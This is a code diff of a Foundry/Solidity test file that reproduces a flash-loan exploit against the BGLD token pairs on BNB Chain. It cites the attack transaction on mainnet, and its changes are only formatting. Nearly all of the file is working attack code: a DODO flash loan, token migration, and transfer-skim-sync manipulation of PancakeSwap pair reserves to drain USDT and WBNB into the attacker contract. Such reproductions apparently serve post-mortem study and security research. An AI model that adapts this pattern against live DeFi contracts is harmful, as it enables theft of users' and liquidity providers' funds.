@@ -9,11 +9,11 @@ import "./interface.sol";
 // @TX
 // https://bscscan.com/tx/0xea108fe94bfc9a71bb3e4dee4a1b0fd47572e6ad6aba8b2155ac44861be628ae
 
-interface ERCPorxy{
+interface ERCPorxy {
     function migrate() external;
 }
 
-contract ContractTest is DSTest{
+contract ContractTest is DSTest {
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 oldBGLD = IERC20(0xC2319E87280c64e2557a51Cb324713Dd8d1410a3);
@@ -29,14 +29,14 @@ contract ContractTest is DSTest{
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 23844529);
+        cheats.createSelectFork("bsc", 23_844_529);
     }
 
     function testExploit() public {
-        oldBGLD.approve(address(Router), type(uint).max);
-        oldBGLD.approve(address(Proxy), type(uint).max);
-        newBGLD.approve(address(Router), type(uint).max);
-        DEBT.approve(address(Router), type(uint).max);
+        oldBGLD.approve(address(Router), type(uint256).max);
+        oldBGLD.approve(address(Proxy), type(uint256).max);
+        newBGLD.approve(address(Router), type(uint256).max);
+        DEBT.approve(address(Router), type(uint256).max);
         DVM(dodo).flashLoan(125 * 1e18, 0, address(this), new bytes(1)); // FlashLoan WBNB
         Proxy.migrate(); // migrate oldBGLD to newBGLD
         newBGLDToDEBT();
@@ -45,17 +45,9 @@ contract ContractTest is DSTest{
         newBGLDToDEBT();
         DEBTToUSDT();
 
-        emit log_named_decimal_uint(
-            "[End] Attacker USDT balance after exploit",
-            USDT.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
 
-        emit log_named_decimal_uint(
-            "[End] Attacker WBNB balance after exploit",
-            WBNB.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
     }
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
@@ -63,7 +55,7 @@ contract ContractTest is DSTest{
         address[] memory path = new address[](2);
         path[0] = address(WBNB);
         path[1] = address(oldBGLD);
-        uint[] memory values = Router.getAmountsOut(125 * 1e18, path);
+        uint256[] memory values = Router.getAmountsOut(125 * 1e18, path);
         WBNB_oldBGLD.swap(0, values[1] * 90 / 100, address(this), "");
         oldBGLD.transfer(address(WBNB_oldBGLD), oldBGLD.balanceOf(address(WBNB_oldBGLD)) * 10 + 10);
         WBNB_oldBGLD.skim(address(this));
@@ -74,68 +66,47 @@ contract ContractTest is DSTest{
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
         DEBT.transfer(address(oldBGLD_DEBT), DEBT.balanceOf(address(this)));
-        (uint oldBGLDreserve, uint DEBTreserve, ) = oldBGLD_DEBT.getReserves();
-        uint amountIn = DEBT.balanceOf(address(oldBGLD_DEBT)) - DEBTreserve;
-        uint amountOut = amountIn * 9975 * oldBGLDreserve / (DEBTreserve * 10000 + amountIn * 9975);
+        (uint256 oldBGLDreserve, uint256 DEBTreserve,) = oldBGLD_DEBT.getReserves();
+        uint256 amountIn = DEBT.balanceOf(address(oldBGLD_DEBT)) - DEBTreserve;
+        uint256 amountOut = amountIn * 9975 * oldBGLDreserve / (DEBTreserve * 10_000 + amountIn * 9975);
         oldBGLD_DEBT.swap(amountOut * 90 / 100, 0, address(this), "");
         oldBGLD.transfer(address(oldBGLD_DEBT), oldBGLD.balanceOf(address(oldBGLD_DEBT)) * 10 + 10);
         oldBGLD_DEBT.skim(address(this));
         oldBGLD_DEBT.sync();
         oldBGLDToDEBT();
-        uint loanAmount = 950 * 1e9;
-        DEBT.transfer(address(newBGLD_DEBT), loanAmount * 10000 / 9975 + 1000);
+        uint256 loanAmount = 950 * 1e9;
+        DEBT.transfer(address(newBGLD_DEBT), loanAmount * 10_000 / 9975 + 1000);
     }
 
     function oldBGLDToWBNB() internal {
-        address [] memory path = new address[](2);
+        address[] memory path = new address[](2);
         path[0] = address(oldBGLD);
         path[1] = address(WBNB);
-        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            100 * 1e6,
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
+        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(100 * 1e6, 0, path, address(this), block.timestamp);
     }
 
     function newBGLDToDEBT() internal {
-        address [] memory path = new address[](2);
+        address[] memory path = new address[](2);
         path[0] = address(newBGLD);
         path[1] = address(DEBT);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            newBGLD.balanceOf(address(this)) * 90 / 100,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            newBGLD.balanceOf(address(this)) * 90 / 100, 0, path, address(this), block.timestamp
         );
     }
 
     function oldBGLDToDEBT() internal {
-        address [] memory path = new address[](2);
+        address[] memory path = new address[](2);
         path[0] = address(oldBGLD);
         path[1] = address(DEBT);
-        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            100 * 1e6,
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
+        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(100 * 1e6, 0, path, address(this), block.timestamp);
     }
-    
+
     function DEBTToUSDT() internal {
-        address [] memory path = new address[](2);
+        address[] memory path = new address[](2);
         path[0] = address(DEBT);
         path[1] = address(USDT);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            DEBT.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            DEBT.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
-
 }
